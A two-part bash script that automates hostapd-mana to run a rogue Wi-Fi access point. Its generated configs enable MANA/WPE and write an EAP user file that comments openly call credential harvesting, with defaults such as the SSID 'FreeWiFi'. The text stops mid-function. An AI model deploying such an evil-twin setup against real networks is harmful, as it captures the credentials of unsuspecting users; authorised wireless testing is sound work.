


```bash
#!/bin/bash

#=============================================================================
# HOSTAPD-MANA PROFESSIONAL MANAGER - PART 1
# Error Handling & Safety, Process Management, Logging, Network Config, CLI
#=============================================================================

set -euo pipefail  # Exit on error, undefined vars, pipe failures
IFS=$'\n\t'       # Secure Internal Field Separator

#=============================================================================
# GLOBAL VARIABLES & CONFIGURATION
#=============================================================================

readonly SCRIPT_NAME="hostapd-mana-manager"
readonly SCRIPT_VERSION="1.0.0"
readonly LOG_BASE_DIR="/var/log/mana_sessions"
readonly CONFIG_DIR="/tmp/mana_config"
readonly PID_FILE="/var/run/mana_manager.pid"

# Session variables (will be set dynamically)
SESSION_ID=""
SESSION_DIR=""
LOG_FILE=""

# Network state backup
declare -A ORIGINAL_STATE
CLEANUP_REQUIRED=false

# Process tracking
HOSTAPD_PID=""
DHCP_PID=""
MONITOR_PID=""

# Interface configuration
INTERFACE=""
MONITOR_INTERFACE=""

#=============================================================================
# ANSI COLORS & FORMATTING
#=============================================================================

readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly WHITE='\033[1;37m'
readonly BOLD='\033[1m'
readonly NC='\033[0m' # No Color

# Log level colors
readonly LOG_INFO="${CYAN}[INFO]${NC}"
readonly LOG_WARN="${YELLOW}[WARN]${NC}"
readonly LOG_ERROR="${RED}[ERROR]${NC}"
readonly LOG_SUCCESS="${GREEN}[SUCCESS]${NC}"
readonly LOG_DEBUG="${PURPLE}[DEBUG]${NC}"

#=============================================================================
# UTILITY FUNCTIONS
#=============================================================================

# Print colored output to stderr
print_status() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case "$level" in
        "INFO")    echo -e "${LOG_INFO} ${timestamp} - $message" >&2 ;;
        "WARN")    echo -e "${LOG_WARN} ${timestamp} - $message" >&2 ;;
        "ERROR")   echo -e "${LOG_ERROR} ${timestamp} - $message" >&2 ;;
        "SUCCESS") echo -e "${LOG_SUCCESS} ${timestamp} - $message" >&2 ;;
        "DEBUG")   echo -e "${LOG_DEBUG} ${timestamp} - $message" >&2 ;;
        *)         echo -e "${timestamp} - $message" >&2 ;;
    esac
}

# Logging function that writes to both console and log file
log_message() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local log_entry="[$level] $timestamp - $message"
    
    # Print to console with colors
    print_status "$level" "$message"
    
    # Write to log file (without colors)
    if [[ -n "$LOG_FILE" && -f "$LOG_FILE" ]]; then
        echo "$log_entry" >> "$LOG_FILE"
    fi
}

# Enhanced error handler with stack trace
error_handler() {
    local exit_code=$?
    local line_no=$1
    
    log_message "ERROR" "Script failed at line $line_no with exit code $exit_code"
    log_message "ERROR" "Call stack:"
    
    local i=0
    while caller $i &>/dev/null; do
        local caller_info=($(caller $i))
        log_message "ERROR" "  ${caller_info[1]}:${caller_info[0]} in ${caller_info[2]}()"
        ((i++))
    done
    
    cleanup_and_exit $exit_code
}

# Set up error handling
trap 'error_handler ${LINENO}' ERR
trap 'cleanup_and_exit 130' INT  # Ctrl+C
trap 'cleanup_and_exit 143' TERM # Termination

#=============================================================================
# SYSTEM VALIDATION & REQUIREMENTS
#=============================================================================

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_message "ERROR" "This script must be run as root"
        echo -e "${RED}Please run with sudo: sudo $0 $*${NC}"
        exit 1
    fi
}

check_dependencies() {
    local deps=("hostapd-mana" "dnsmasq" "iptables" "iwconfig" "ip" "rfkill")
    local missing_deps=()
    
    log_message "INFO" "Checking system dependencies..."
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing_deps+=("$dep")
        fi
    done
    
    # Check for hostapd-mana specifically
    if ! hostapd-mana -h &>/dev/null; then
        if ! hostapd -h | grep -q "mana\|evil"; then
            missing_deps+=("hostapd-mana")
        fi
    fi
    
    if [[ ${#missing_deps[@]} -gt 0 ]]; then
        log_message "ERROR" "Missing dependencies: ${missing_deps[*]}"
        echo -e "\n${YELLOW}Installation commands:${NC}"
        echo "  Ubuntu/Debian: apt-get install hostapd dnsmasq iptables wireless-tools iproute2 rfkill"
        echo "  Kali Linux: apt-get install hostapd-mana dnsmasq"
        echo "  Arch Linux: pacman -S hostapd dnsmasq iptables wireless_tools iproute2 rfkill"
        exit 1
    fi
    
    log_message "SUCCESS" "All dependencies satisfied"
}

# Detect hypervisor environment
detect_hypervisor() {
    local hypervisor="none"
    
    if [[ -f /sys/hypervisor/uuid ]] && grep -q "^[0-9a-f]\{8\}-" /sys/hypervisor/uuid 2>/dev/null; then
        hypervisor="xen"
    elif [[ -d /proc/xen ]]; then
        hypervisor="xen"
    elif lscpu | grep -q "Hypervisor vendor.*VMware"; then
        hypervisor="vmware"
    elif lscpu | grep -q "Hypervisor vendor.*Microsoft"; then
        hypervisor="hyperv"
    elif [[ -f /sys/class/dmi/id/product_name ]] && grep -qi "virtualbox" /sys/class/dmi/id/product_name; then
        hypervisor="virtualbox"
    elif [[ -f /sys/class/dmi/id/sys_vendor ]] && grep -qi "qemu\|kvm" /sys/class/dmi/id/sys_vendor; then
        hypervisor="kvm"
    elif systemd-detect-virt &>/dev/null; then
        hypervisor=$(systemd-detect-virt)
    fi
    
    echo "$hypervisor"
}

# Apply VM-specific optimizations
optimize_for_vm() {
    local hypervisor="$1"
    
    if [[ "$hypervisor" != "none" ]]; then
        log_message "INFO" "Detected hypervisor: $hypervisor - applying VM optimizations"
        
        # Increase network buffers for VM environments
        echo 'net.core.rmem_max = 67108864' > /etc/sysctl.d/99-mana-vm.conf
        echo 'net.core.wmem_max = 67108864' >> /etc/sysctl.d/99-mana-vm.conf
        echo 'net.core.netdev_max_backlog = 5000' >> /etc/sysctl.d/99-mana-vm.conf
        sysctl -p /etc/sysctl.d/99-mana-vm.conf &>/dev/null
        
        # USB 3.0 buffer optimization
        if [[ -d /sys/module/usbcore/parameters ]]; then
            echo 256 > /sys/module/usbcore/parameters/usbfs_memory_mb 2>/dev/null || true
        fi
        
        log_message "SUCCESS" "VM optimizations applied"
    fi
}

#=============================================================================
# WIRELESS INTERFACE MANAGEMENT
#=============================================================================

# Get detailed wireless interface information
get_wireless_interfaces() {
    local interfaces=()
    
    # Method 1: Check /proc/net/wireless
    if [[ -f /proc/net/wireless ]]; then
        while IFS= read -r line; do
            if [[ $line =~ ^[[:space:]]*([^:]+): ]]; then
                local iface="${BASH_REMATCH[1]// /}"
                [[ "$iface" != "Interface" ]] && interfaces+=("$iface")
            fi
        done < /proc/net/wireless
    fi
    
    # Method 2: Check iwconfig output
    while IFS= read -r line; do
        if [[ $line =~ ^([^[:space:]]+)[[:space:]]+IEEE ]]; then
            local iface="${BASH_REMATCH[1]}"
            [[ ! " ${interfaces[*]} " =~ " $iface " ]] && interfaces+=("$iface")
        fi
    done < <(iwconfig 2>/dev/null)
    
    # Method 3: Check /sys/class/net for wireless interfaces
    for netdev in /sys/class/net/*; do
        local iface=$(basename "$netdev")
        if [[ -d "$netdev/wireless" || -L "$netdev/phy80211" ]]; then
            [[ ! " ${interfaces[*]} " =~ " $iface " ]] && interfaces+=("$iface")
        fi
    done
    
    printf '%s\n' "${interfaces[@]}" | sort -u
}

# Get detailed interface information
get_interface_info() {
    local iface="$1"
    local info=""
    
    # Get driver info
    local driver="unknown"
    if [[ -L "/sys/class/net/$iface/device/driver" ]]; then
        driver=$(basename "$(readlink "/sys/class/net/$iface/device/driver")")
    fi
    
    # Get USB info if applicable
    local usb_info=""
    local usb_path="/sys/class/net/$iface/device"
    if [[ -f "$usb_path/uevent" ]] && grep -q "usb" "$usb_path/uevent" 2>/dev/null; then
        local vendor=$(cat "$usb_path/idVendor" 2>/dev/null || echo "unknown")
        local product=$(cat "$usb_path/idProduct" 2>/dev/null || echo "unknown")
        usb_info=" (USB: $vendor:$product)"
    fi
    
    # Get PHY info
    local phy_info=""
    if [[ -L "/sys/class/net/$iface/phy80211" ]]; then
        local phy=$(basename "$(readlink "/sys/class/net/$iface/phy80211")")
        phy_info=" PHY: $phy"
    fi
    
    # Check monitor mode support
    local monitor_support="unknown"
    if iw dev "$iface" info &>/dev/null; then
        if iw phy | grep -A 20 "Wiphy.*$(iw dev "$iface" info | awk '/wiphy/ {print $2}')" | grep -q "monitor"; then
            monitor_support="yes"
        else
            monitor_support="no"
        fi
    fi
    
    echo "Driver: $driver$usb_info$phy_info Monitor: $monitor_support"
}

# Validate wireless interface capabilities
validate_interface() {
    local iface="$1"
    local errors=()
    
    # Check if interface exists
    if ! ip link show "$iface" &>/dev/null; then
        errors+=("Interface $iface does not exist")
        return 1
    fi
    
    # Check if it's a wireless interface
    if ! iwconfig "$iface" &>/dev/null; then
        errors+=("Interface $iface is not a wireless interface")
    fi
    
    # Check if it supports monitor mode
    if ! iw dev "$iface" info &>/dev/null; then
        errors+=("Interface $iface does not support nl80211 (modern wireless)")
    else
        local wiphy=$(iw dev "$iface" info | awk '/wiphy/ {print $2}')
        if ! iw phy "$wiphy" info | grep -q "monitor"; then
            errors+=("Interface $iface does not support monitor mode")
        fi
    fi
    
    # Check if interface is not in use
    if [[ $(cat "/sys/class/net/$iface/operstate" 2>/dev/null) == "up" ]]; then
        if pgrep -f "$iface" &>/dev/null; then
            errors+=("Interface $iface appears to be in use")
        fi
    fi
    
    if [[ ${#errors[@]} -gt 0 ]]; then
        for error in "${errors[@]}"; do
            log_message "ERROR" "$error"
        done
        return 1
    fi
    
    return 0
}

# Auto-detect best wireless interface
auto_detect_interface() {
    local interfaces=($(get_wireless_interfaces))
    local best_interface=""
    local best_score=0
    
    log_message "INFO" "Auto-detecting best wireless interface..."
    
    if [[ ${#interfaces[@]} -eq 0 ]]; then
        log_message "ERROR" "No wireless interfaces found"
        return 1
    fi
    
    for iface in "${interfaces[@]}"; do
        local score=0
        local info=$(get_interface_info "$iface")
        
        log_message "DEBUG" "Evaluating $iface: $info"
        
        # Score based on various factors
        if validate_interface "$iface" 2>/dev/null; then
            ((score += 100))  # Works = high priority
        fi
        
        # Prefer USB 3.0 adapters
        if echo "$info" | grep -q "USB"; then
            ((score += 50))
        fi
        
        # Prefer certain known-good drivers
        if echo "$info" | grep -E "(rt2800usb|rt73usb|ath9k_htc|carl9170)" &>/dev/null; then
            ((score += 30))
        fi
        
        # Prefer interfaces not currently up
        if [[ $(cat "/sys/class/net/$iface/operstate" 2>/dev/null) != "up" ]]; then
            ((score += 20))
        fi
        
        log_message "DEBUG" "$iface score: $score"
        
        if [[ $score -gt $best_score ]]; then
            best_score=$score
            best_interface="$iface"
        fi
    done
    
    if [[ -n "$best_interface" ]]; then
        log_message "SUCCESS" "Selected interface: $best_interface (score: $best_score)"
        echo "$best_interface"
        return 0
    else
        log_message "ERROR" "No suitable wireless interface found"
        return 1
    fi
}

#=============================================================================
# NETWORK STATE MANAGEMENT
#=============================================================================

# Backup current network state
backup_network_state() {
    log_message "INFO" "Backing up current network state..."
    
    # Backup NetworkManager state
    if systemctl is-active NetworkManager &>/dev/null; then
        ORIGINAL_STATE[networkmanager]="active"
    else
        ORIGINAL_STATE[networkmanager]="inactive"
    fi
    
    # Backup IP forwarding
    ORIGINAL_STATE[ip_forward]=$(cat /proc/sys/net/ipv4/ip_forward)
    
    # Backup interface state
    ORIGINAL_STATE[interface_state]=$(ip link show "$INTERFACE" | grep -o "state [A-Z]*" | cut -d' ' -f2)
    
    # Backup iptables rules (simplified)
    ORIGINAL_STATE[iptables_forward]=$(iptables -L FORWARD -n | wc -l)
    
    log_message "SUCCESS" "Network state backed up"
    CLEANUP_REQUIRED=true
}

# Restore original network state
restore_network_state() {
    if [[ "$CLEANUP_REQUIRED" != "true" ]]; then
        return 0
    fi
    
    log_message "INFO" "Restoring original network state..."
    
    # Stop our processes first
    stop_all_processes
    
    # Remove monitor interface if created
    if [[ -n "$MONITOR_INTERFACE" ]] && ip link show "$MONITOR_INTERFACE" &>/dev/null; then
        log_message "INFO" "Removing monitor interface: $MONITOR_INTERFACE"
        ip link delete "$MONITOR_INTERFACE" 2>/dev/null || true
    fi
    
    # Restore interface to managed mode
    if [[ -n "$INTERFACE" ]]; then
        log_message "INFO" "Restoring interface $INTERFACE to managed mode"
        ip link set "$INTERFACE" down 2>/dev/null || true
        iw dev "$INTERFACE" set type managed 2>/dev/null || true
        ip link set "$INTERFACE" up 2>/dev/null || true
    fi
    
    # Restore IP forwarding
    if [[ -n "${ORIGINAL_STATE[ip_forward]:-}" ]]; then
        echo "${ORIGINAL_STATE[ip_forward]}" > /proc/sys/net/ipv4/ip_forward
        log_message "INFO" "IP forwarding restored to: ${ORIGINAL_STATE[ip_forward]}"
    fi
    
    # Clean up iptables rules
    iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null || true
    iptables -t nat -D POSTROUTING -o wlan0 -j MASQUERADE 2>/dev/null || true
    iptables -D FORWARD -i wlan0 -o eth0 -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
    
    # Restore NetworkManager
    if [[ "${ORIGINAL_STATE[networkmanager]:-}" == "active" ]]; then
        log_message "INFO" "Restarting NetworkManager..."
        systemctl start NetworkManager &>/dev/null || true
    fi
    
    # Remove temporary files
    [[ -d "$CONFIG_DIR" ]] && rm -rf "$CONFIG_DIR"
    [[ -f "$PID_FILE" ]] && rm -f "$PID_FILE"
    
    # Remove VM optimizations
    [[ -f /etc/sysctl.d/99-mana-vm.conf ]] && rm -f /etc/sysctl.d/99-mana-vm.conf
    
    log_message "SUCCESS" "Network state restored"
    CLEANUP_REQUIRED=false
}

#=============================================================================
# PROCESS MANAGEMENT
#=============================================================================

# Stop all managed processes
stop_all_processes() {
    local pids_to_kill=()
    
    if [[ -n "$HOSTAPD_PID" ]]; then
        pids_to_kill+=("$HOSTAPD_PID")
    fi
    
    if [[ -n "$DHCP_PID" ]]; then
        pids_to_kill+=("$DHCP_PID")
    fi
    
    if [[ -n "$MONITOR_PID" ]]; then
        pids_to_kill+=("$MONITOR_PID")
    fi
    
    # Kill processes gracefully
    for pid in "${pids_to_kill[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            log_message "INFO" "Stopping process: $pid"
            kill -TERM "$pid" 2>/dev/null || true
            
            # Wait for graceful shutdown
            local count=0
            while kill -0 "$pid" 2>/dev/null && [[ $count -lt 10 ]]; do
                sleep 1
                ((count++))
            done
            
            # Force kill if still running
            if kill -0 "$pid" 2>/dev/null; then
                log_message "WARN" "Force killing process: $pid"
                kill -KILL "$pid" 2>/dev/null || true
            fi
        fi
    done
    
    # Kill any remaining hostapd-mana processes
    pkill -f "hostapd-mana" 2>/dev/null || true
    pkill -f "dnsmasq.*mana" 2>/dev/null || true
    
    HOSTAPD_PID=""
    DHCP_PID=""
    MONITOR_PID=""
}

#=============================================================================
# SESSION MANAGEMENT
#=============================================================================

# Initialize session
initialize_session() {
    SESSION_ID="mana_$(date +%Y%m%d_%H%M%S)_$$"
    SESSION_DIR="$LOG_BASE_DIR/$SESSION_ID"
    LOG_FILE="$SESSION_DIR/session.log"
    
    # Create directories
    mkdir -p "$SESSION_DIR"
    mkdir -p "$CONFIG_DIR"
    
    # Initialize log file
    {
        echo "=== HOSTAPD-MANA SESSION LOG ==="
        echo "Session ID: $SESSION_ID"
        echo "Started: $(date)"
        echo "Script Version: $SCRIPT_VERSION"
        echo "================================="
        echo ""
    } > "$LOG_FILE"
    
    # Store session info
    echo "$SESSION_ID" > "$SESSION_DIR/session_id"
    echo "$$" > "$SESSION_DIR/main_pid"
    
    # Create PID file
    echo "$$" > "$PID_FILE"
    
    log_message "SUCCESS" "Session initialized: $SESSION_ID"
    log_message "INFO" "Logs directory: $SESSION_DIR"
}

#=============================================================================
# NETWORK CONFIGURATION
#=============================================================================

# Configure wireless interface for AP mode
configure_interface() {
    local iface="$1"
    
    log_message "INFO" "Configuring interface: $iface"
    
    # Disable USB autosuspend for wireless devices
    disable_usb_autosuspend "$iface"
    
    # Optimize power management
    optimize_power_management "$iface"
    
    # Stop NetworkManager for this interface
    if systemctl is-active NetworkManager &>/dev/null; then
        log_message "INFO" "Stopping NetworkManager temporarily"
        systemctl stop NetworkManager
    fi
    
    # Bring interface down
    ip link set "$iface" down
    
    # Kill any processes using the interface
    local processes=$(lsof -t "/dev/$iface" 2>/dev/null || true)
    if [[ -n "$processes" ]]; then
        log_message "INFO" "Killing processes using $iface: $processes"
        echo "$processes" | xargs -r kill -TERM
        sleep 2
        echo "$processes" | xargs -r kill -KILL 2>/dev/null || true
    fi
    
    # Set to managed mode first, then to AP mode
    iw dev "$iface" set type managed 2>/dev/null || true
    sleep 1
    
    # Check if we can set to AP mode directly
    if ! iw dev "$iface" set type __ap 2>/dev/null; then
        log_message "INFO" "Direct AP mode not supported, using monitor mode approach"
        
        # Create monitor interface
        MONITOR_INTERFACE="${iface}mon"
        if ip link show "$MONITOR_INTERFACE" &>/dev/null; then
            ip link delete "$MONITOR_INTERFACE"
        fi
        
        iw dev "$iface" interface add "$MONITOR_INTERFACE" type monitor
        ip link set "$MONITOR_INTERFACE" up
        
        # Use original interface for AP
        iw dev "$iface" set type managed
    fi
    
    # Configure IP address
    ip addr flush dev "$iface"
    ip addr add 192.168.100.1/24 dev "$iface"
    ip link set "$iface" up
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Configure iptables for NAT
    configure_nat_rules
    
    log_message "SUCCESS" "Interface $iface configured successfully"
}

# Disable USB autosuspend for WiFi devices
disable_usb_autosuspend() {
    local iface="$1"
    local usb_path="/sys/class/net/$iface/device"
    
    if [[ -f "$usb_path/power/autosuspend" ]]; then
        log_message "INFO" "Disabling USB autosuspend for $iface"
        echo -1 > "$usb_path/power/autosuspend" 2>/dev/null || true
        echo on > "$usb_path/power/control" 2>/dev/null || true
    fi
    
    # Global USB autosuspend disable for WiFi devices
    for usb_dev in /sys/bus/usb/devices/*/; do
        if [[ -f "$usb_dev/bInterfaceClass" ]] && [[ $(cat "$usb_dev/bInterfaceClass" 2>/dev/null) == "e0" ]]; then
            echo on > "$usb_dev/power/control" 2>/dev/null || true
        fi
    done
}

# Optimize power management for external WiFi adapters
optimize_power_management() {
    local iface="$1"
    
    # Disable power management
    iwconfig "$iface" power off 2>/dev/null || true
    
    # Set txpower to maximum
    iwconfig "$iface" txpower 20 2>/dev/null || true
    
    log_message "INFO" "Power management optimized for $iface"
}

# Configure NAT rules
configure_nat_rules() {
    log_message "INFO" "Configuring NAT rules"
    
    # Find internet-connected interface
    local internet_iface
    internet_iface=$(ip route | awk '/default/ {print $5}' | head -n1)
    
    if [[ -z "$internet_iface" ]]; then
        log_message "WARN" "No default route found, using eth0 for NAT"
        internet_iface="eth0"
    fi
    
    # Configure iptables
    iptables -t nat -A POSTROUTING -o "$internet_iface" -j MASQUERADE
    iptables -A FORWARD -i "$INTERFACE" -o "$internet_iface" -j ACCEPT
    iptables -A FORWARD -i "$internet_iface" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    
    log_message "SUCCESS" "NAT configured with internet interface: $internet_iface"
}

#=============================================================================
# CLEANUP & EXIT
#=============================================================================

cleanup_and_exit() {
    local exit_code=${1:-0}
    
    log_message "INFO" "Cleaning up and exiting (code: $exit_code)..."
    
    # Restore network state
    restore_network_state
    
    # Final log entry
    if [[ -n "$LOG_FILE" && -f "$LOG_FILE" ]]; then
        {
            echo ""
            echo "================================="
            echo "Session ended: $(date)"
            echo "Exit code: $exit_code"
            echo "=== END OF SESSION LOG ==="
        } >> "$LOG_FILE"
    fi
    
    exit "$exit_code"
}

#=============================================================================
# COMMAND LINE INTERFACE
#=============================================================================

show_help() {
    cat << 'EOF'
HOSTAPD-MANA PROFESSIONAL MANAGER

USAGE:
    hostapd-mana-manager [OPTIONS]

OPTIONS:
    -i, --interface IFACE    Specify wireless interface (auto-detected if not provided)
    -s, --ssid SSID         Set AP SSID (default: "FreeWiFi")
    -c, --channel CHANNEL   Set WiFi channel (default: 6)
    -p, --password PASS     Set WPA2 password (creates open network if not specified)
    --no-dhcp               Disable DHCP server
    --monitor-only          Only start monitoring, no AP
    --dry-run               Validate configuration without starting
    -v, --verbose           Enable verbose logging
    -q, --quiet             Suppress non-error output
    -h, --help              Show this help message
    --version               Show version information

EXAMPLES:
    # Auto-detect interface and start with default settings
    sudo hostapd-mana-manager

    # Use specific interface with custom SSID
    sudo hostapd-mana-manager -i wlan0 -s "Corporate WiFi"

    # Create WPA2 protected network
    sudo hostapd-mana-manager -s "SecureAP" -p "mypassword123"

    # Use specific channel and disable DHCP
    sudo hostapd-mana-manager -c 11 --no-dhcp

    # Validate configuration without starting
    sudo hostapd-mana-manager --dry-run -i wlan1

FEATURES:
    ✓ Automatic wireless interface detection and validation
    ✓ VM environment detection with performance optimizations  
    ✓ USB autosuspend disable for external WiFi adapters
    ✓ Professional logging with session management
    ✓ Complete network state backup and restoration
    ✓ Graceful cleanup on Ctrl+C or unexpected exit
    ✓ HTML report generation with session summary
    ✓ WPA2 password protection with secure configuration

DIRECTORIES:
    Logs:          /var/log/mana_sessions/
    Config:        /tmp/mana_config/
    PID File:      /var/run/mana_manager.pid

REQUIREMENTS:
    - hostapd-mana (or patched hostapd)
    - dnsmasq
    - iptables  
    - wireless-tools
    - iproute2
    - rfkill

For more information and updates:
    https://github.com/sensepost/hostapd-mana

EOF
}

show_version() {
    echo "$SCRIPT_NAME version $SCRIPT_VERSION"
    echo "Professional hostapd-mana management and automation toolkit"
}

# Parse command line arguments
parse_arguments() {
    local TEMP
    TEMP=$(getopt -o 'i:s:c:p:vqh' --long 'interface:,ssid:,channel:,password:,no-dhcp,monitor-only,dry-run,verbose,quiet,help,version' -n "$SCRIPT_NAME" -- "$@")
    
    if [[ $? -ne 0 ]]; then
        echo "Failed to parse arguments. Use --help for usage information." >&2
        exit 1
    fi
    
    eval set -- "$TEMP"
    unset TEMP
    
    # Default values
    INTERFACE=""
    SSID="FreeWiFi"
    CHANNEL="6"
    PASSWORD=""
    ENABLE_DHCP=true
    MONITOR_ONLY=false
    DRY_RUN=false
    VERBOSE=false
    QUIET=false
    
    while true; do
        case "$1" in
            '-i'|'--interface')
                INTERFACE="$2"
                shift 2
                continue
                ;;
            '-s'|'--ssid')
                SSID="$2"
                shift 2
                continue
                ;;
            '-c'|'--channel')
                CHANNEL="$2"
                shift 2
                continue
                ;;
            '-p'|'--password')
                PASSWORD="$2"
                shift 2
                continue
                ;;
            '--no-dhcp')
                ENABLE_DHCP=false
                shift
                continue
                ;;
            '--monitor-only')
                MONITOR_ONLY=true
                shift
                continue
                ;;
            '--dry-run')
                DRY_RUN=true
                shift
                continue
                ;;
            '-v'|'--verbose')
                VERBOSE=true
                shift
                continue
                ;;
            '-q'|'--quiet')
                QUIET=true
                shift
                continue
                ;;
            '-h'|'--help')
                show_help
                exit 0
                ;;
            '--version')
                show_version
                exit 0
                ;;
            '--')
                shift
                break
                ;;
            *)
                log_message "ERROR" "Unknown argument: $1"
                exit 1
                ;;
        esac
    done
}

#=============================================================================
# MAIN EXECUTION FUNCTION FOR PART 1
#=============================================================================

# Main function that ties together Part 1 functionality
main_part1() {
    local args=("$@")
    
    # Parse arguments
    parse_arguments "${args[@]}"
    
    # Check requirements
    check_root
    check_dependencies
    
    # Initialize session
    initialize_session
    
    # Detect and optimize for hypervisor
    local hypervisor=$(detect_hypervisor)
    optimize_for_vm "$hypervisor"
    
    # Auto-detect interface if not specified
    if [[ -z "$INTERFACE" ]]; then
        INTERFACE=$(auto_detect_interface)
        if [[ $? -ne 0 ]]; then
            log_message "ERROR" "Failed to auto-detect wireless interface"
            cleanup_and_exit 1
        fi
    else
        # Validate specified interface
        if ! validate_interface "$INTERFACE"; then
            log_message "ERROR" "Invalid interface: $INTERFACE"
            cleanup_and_exit 1
        fi
    fi
    
    # Backup network state
    backup_network_state
    
    # Configure interface
    if [[ "$DRY_RUN" != "true" ]]; then
        configure_interface "$INTERFACE"
    fi
    
    log_message "SUCCESS" "Part 1 initialization complete"
    log_message "INFO" "Interface: $INTERFACE, Session: $SESSION_ID"
}

# Call main function if script is executed directly (for testing Part 1)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main_part1 "$@"
fi

#!/bin/bash

#=============================================================================
# HOSTAPD-MANA PROFESSIONAL MANAGER - PART 2
# Client Connection Monitoring & WiFi Password Configuration
#=============================================================================

# This part continues from Part 1 - add this to your main script after Part 1

#=============================================================================
# CONFIGURATION VARIABLES (continued from Part 1)
#=============================================================================

# Additional configuration variables for Part 2
PASSWORD=""
ENABLE_DHCP=true
MONITOR_ONLY=false
DRY_RUN=false
VERBOSE=false
QUIET=false

# Client monitoring
declare -A CONNECTED_CLIENTS
CLIENT_LOG_FILE=""
MONITORING_ACTIVE=false

#=============================================================================
# COMMAND LINE PARSING COMPLETION (continued from Part 1)
#=============================================================================

# Complete the parse_arguments function from Part 1
complete_argument_parsing() {
    local TEMP
    TEMP=$(getopt -o 'i:s:c:p:vqh' --long 'interface:,ssid:,channel:,password:,no-dhcp,monitor-only,dry-run,verbose,quiet,help,version' -n "$SCRIPT_NAME" -- "$@")
    
    if [[ $? -ne 0 ]]; then
        echo "Failed to parse arguments. Use --help for usage information." >&2
        exit 1
    fi
    
    eval set -- "$TEMP"
    unset TEMP
    
    while true; do
        case "$1" in
            '-i'|'--interface')
                INTERFACE="$2"
                shift 2
                continue
                ;;
            '-s'|'--ssid')
                SSID="$2"
                shift 2
                continue
                ;;
            '-c'|'--channel')
                CHANNEL="$2"
                shift 2
                continue
                ;;
            '-p'|'--password')
                PASSWORD="$2"
                shift 2
                continue
                ;;
            '--no-dhcp')
                ENABLE_DHCP=false
                shift
                continue
                ;;
            '--monitor-only')
                MONITOR_ONLY=true
                shift
                continue
                ;;
            '--dry-run')
                DRY_RUN=true
                shift
                continue
                ;;
            '-v'|'--verbose')
                VERBOSE=true
                shift
                continue
                ;;
            '-q'|'--quiet')
                QUIET=true
                shift
                continue
                ;;
            '-h'|'--help')
                show_help
                exit 0
                ;;
            '--version')
                show_version
                exit 0
                ;;
            '--')
                shift
                break
                ;;
            *)
                log_message "ERROR" "Unknown argument: $1"
                exit 1
                ;;
        esac
    done
}

#=============================================================================
# WIFI CONFIGURATION MANAGEMENT
#=============================================================================

# Generate secure WPA2 configuration
generate_wpa2_config() {
    local config_file="$CONFIG_DIR/hostapd.conf"
    local ssid="$1"
    local password="$2"
    local channel="$3"
    local interface="$4"
    
    log_message "INFO" "Generating WPA2 configuration"
    
    # Validate password strength
    if [[ ${#password} -lt 8 ]]; then
        log_message "ERROR" "WPA2 password must be at least 8 characters long"
        return 1
    fi
    
    if [[ ${#password} -gt 63 ]]; then
        log_message "ERROR" "WPA2 password must be at most 63 characters long"
        return 1
    fi
    
    cat > "$config_file" << EOF
# hostapd-mana configuration - WPA2 Protected
# Generated: $(date)
# Session: $SESSION_ID

interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# WPA2 Configuration
wpa=2
wpa_passphrase=$password
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP

# MANA Configuration
enable_mana=1
mana_wpe=1
mana_eapsuccess=1
mana_credout=$SESSION_DIR/hostapd.credout
mana_eaptls=1

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

# Additional Security Settings
wpa_strict_rekey=1
wpa_group_rekey=86400
wpa_gmk_rekey=86400
wpa_ptk_rekey=600

EOF

    log_message "SUCCESS" "WPA2 configuration generated"
    return 0
}

# Generate open network configuration
generate_open_config() {
    local config_file="$CONFIG_DIR/hostapd.conf"
    local ssid="$1"
    local channel="$2"
    local interface="$3"
    
    log_message "INFO" "Generating open network configuration"
    
    cat > "$config_file" << EOF
# hostapd-mana configuration - Open Network
# Generated: $(date)
# Session: $SESSION_ID

interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# Open Network - No WPA
wpa=0

# MANA Configuration
enable_mana=1
mana_wpe=1
mana_eapsuccess=1
mana_credout=$SESSION_DIR/hostapd.credout
mana_eaptls=1

# EAP Configuration for Credential Harvesting
ieee8021x=1
eapol_version=1
eap_server=1
eap_user_file=$CONFIG_DIR/hostapd.eap_user

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

EOF

    # Create EAP user file for credential harvesting
    cat > "$CONFIG_DIR/hostapd.eap_user" << 'EOF'
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS-MSCHAPV2    "pass"   [2]
EOF

    log_message "SUCCESS" "Open network configuration generated"
    return 0
}

# Validate WiFi configuration
validate_wifi_config() {
    local ssid="$1"
    local channel="$2"
    local password="$3"
    local errors=()
    
    # Validate SSID
    if [[ -z "$ssid" ]]; then
        errors+=("SSID cannot be empty")
    elif [[ ${#ssid} -gt 32 ]]; then
        errors+=("SSID cannot be longer than 32 characters")
    elif [[ "$ssid" =~ [^[:print:]] ]]; then
        errors+=("SSID contains non-printable characters")
    fi
    
    # Validate channel
    if [[ ! "$channel" =~ ^[0-9]+$ ]]; then
        errors+=("Channel must be a number")
    elif [[ $channel -lt 1 || $channel -gt 14 ]]; then
        errors+=("Channel must be between 1 and 14")
    fi
    
    # Validate password if provided
